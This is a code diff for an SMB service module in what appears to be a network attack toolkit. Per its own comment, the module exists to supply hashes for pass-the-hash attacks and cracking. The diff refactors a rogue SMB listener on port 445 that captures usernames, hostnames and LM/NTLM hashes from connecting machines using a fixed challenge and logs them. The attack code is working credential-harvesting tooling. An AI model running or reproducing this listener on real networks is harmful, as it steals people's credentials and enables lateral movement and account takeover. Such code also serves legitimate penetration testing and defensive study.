@@ -8,6 +8,7 @@ from service import Service
 # This module is used to provide hashes for pass-the-hash attacks and
 # potential in-house hash cracking we build.
 #
+__name__='SMB Service'
 class SMBService(Service):
 	def __init__(self):
 		self.captured_hashes = {}	
@@ -70,17 +71,9 @@ class SMBService(Service):
 		if not uname in self.captured_hashes:
 			tmp = [hname, lm_hash.upper(), ntlm_hash.upper()]
 			self.captured_hashes[uname] = tmp
-
-		if self.dump:
-			util.Msg('\tUser name: \033[32m%s\033[0m'%(uname))
-			util.Msg('\tHost: \033[32m%s\033[0m'%(hname))
-			util.Msg('\tLM:   \033[32m%s\033[0m'%(lm_hash.upper()))
-			util.Msg('\tNTLM: \033[32m%s\033[0m'%ntlm_hash.upper())
-			util.Msg('\tChallenge: \033[32m%s\033[0m'%('1122334455667788'))
-
-		if self.log_data:
-			data = 'Username: %s\nHost: %s\nLM: %s\nNTLM: %s\nChallenge: %s\n'%(uname,hname,lm_hash.upper(),ntlm_hash.upper(),'1122334455667788')
-			self.log_file.write(data + '\n')
+	
+		data = 'Username: %s\nHost: %s\nLM: %s\nNTLM: %s\nChallenge: %s\n'%(uname,hname,lm_hash.upper(),ntlm_hash.upper(),'1122334455667788')
+		self.log_msg(data)
 
 	# get packet payload 
 	def get_payload(self, data):
@@ -184,20 +177,25 @@ class SMBService(Service):
 		util.Msg('Starting SMB listener...')
 		thread = Thread(target=self.initialize)
 		thread.start()
-		return
+		return True
 
 	# initialize SMB listener
 	def initialize(self):
 		socker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		socker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		socker.settimeout(3)
+		socker.settimeout(5)
 		socker.bind(('', 445))
 		socker.listen(5)
 		self.running = True
-		while self.running:
-			try:
-				con, addr = socker.accept()
-				if self.dump: util.Msg('Connection from %s'%addr[0])	
+		try:
+			while self.running:
+				try:
+					con, addr = socker.accept()
+				except KeyboardInterrupt:
+					break	
+				except:
+					continue
+				if self.dump: self.log_msg('Connection from %s'%addr[0])	
 				while self.running:
 					data = con.recv(256)
 					if not self.handler(con, data):
@@ -205,14 +203,12 @@ class SMBService(Service):
 				con.shutdown(socket.SHUT_RDWR)
 				con.close()
 				if self.dump: util.Msg('Closed connection with %s.\n'%addr[0])
-			except KeyboardInterrupt:
-				self.running = False
-				break
-			except socket.error:
-			 	continue
-			except Exception, j:
-			 	util.Error('Error with SMB listener: %s'%j)
-			 	self.running = False
-			 	break
+		except KeyboardInterrupt:
+			self.running = False
+		except socket.error:
+			pass	
+		except Exception, j:
+		 	util.Error('Error with SMB listener: %s'%j)
+		 	self.running = False
 		socker.close()
 		util.debug('SMB listener shutdown.')
